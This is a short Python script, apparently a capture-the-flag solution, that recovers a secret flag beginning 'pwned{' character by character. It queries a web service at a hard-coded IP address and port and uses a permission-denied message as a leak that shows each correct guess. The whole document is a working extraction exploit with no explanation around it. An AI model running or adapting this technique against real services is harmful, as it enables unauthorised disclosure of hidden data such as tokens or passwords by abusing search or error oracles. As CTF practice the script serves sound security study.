import requests
import string
alphalist = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '"', '£', '$', '%', '^', '&', '*', '(', ')', '_', '+', '-', '=', '{', '}', '[', ']', '~', '@', ':', ';', "'", '#', '<', '>', '?', ',', '.', '/', '|', '\\', '`']
payload = {'q': ''}
start = "pwned{"
for i in range(len(alphalist)):
    for char in alphalist:
        payload['q'] = f"{start}{char}"
        r = requests.get('http://157.245.28.90:12001', params=payload)
        response = r.text
        if "You don't have permission to view the result." in response:
            start = start + char
            print(start)
            break
        else:
            continue
